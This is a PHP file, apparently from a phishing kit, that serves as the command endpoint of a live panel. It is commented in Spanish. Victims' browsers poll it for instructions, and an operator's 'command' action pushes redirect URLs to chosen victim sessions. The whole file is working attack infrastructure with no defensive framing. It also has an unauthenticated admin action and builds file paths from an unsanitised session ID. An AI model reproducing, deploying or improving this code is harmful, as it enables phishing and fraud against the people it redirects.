<?php
// api.php - API para Polling y Comandos Admin
require 'config.php';

header('Content-Type: application/json');

$action = $_GET['action'] ?? '';
$sid = $_REQUEST['sid'] ?? '';

if (empty($sid)) {
    echo json_encode(['error' => 'No Session ID']);
    exit;
}

$file = DATA_DIR . "/{$sid}.json";

// --- ACCIÓN: POLL (VÍCTIMA) ---
if ($action === 'poll') {
    if (!file_exists($file)) {
        // Si no existe el archivo, quizás expiró o es inválido.
        // Podemos decirle que no haga nada o redirigir a inicio.
        echo json_encode(['command' => 'wait']); 
        exit;
    }

    $data = json_decode(file_get_contents($file), true);
    
    // Actualizar last_seen
    $data['last_seen'] = time();
    file_put_contents($file, json_encode($data));

    // Responder con el comando actual
    if (!empty($data['command'])) {
        echo json_encode([
            'command' => $data['command'],
            'url' => $data['target_url'] ?? ''
        ]);
        
        // Opcional: Limpiar el comando después de enviarlo para que no se ejecute en bucle
        // Pero como es redirección, la víctima se irá. Si es 'wait', se queda.
        // Si es redirección, mejor no borrarlo inmediatamente por si el poll falla, 
        // pero el cliente dejará de pollear al irse.
    } else {
        echo json_encode(['command' => 'wait']);
    }
    exit;
}

// --- ACCIÓN: COMMAND (ADMIN) ---
if ($action === 'command') {
    // Aquí podrías agregar autenticación básica si quisieras proteger el panel
    
    $cmd = $_POST['cmd'] ?? '';
    $url = $_POST['url'] ?? '';

    if (!file_exists($file)) {
        // Intentar buscar si es un ID con sufijo '_token' (aunque mi lógica usa el mismo ID)
        // Si usas lógica de sufijos en el panel admin, adáptalo aquí.
        // Por ahora, asumimos ID limpio.
        echo json_encode(['status' => 'error', 'message' => 'Sesión no encontrada']);
        exit;
    }

    $data = json_decode(file_get_contents($file), true);
    $data['command'] = $cmd; // 'redirect'
    $data['target_url'] = $url;
    
    file_put_contents($file, json_encode($data));
    
    echo json_encode(['status' => 'ok', 'message' => "Comando enviado a {$sid}: {$url}"]);
    exit;
}

echo json_encode(['error' => 'Invalid action']);
?>
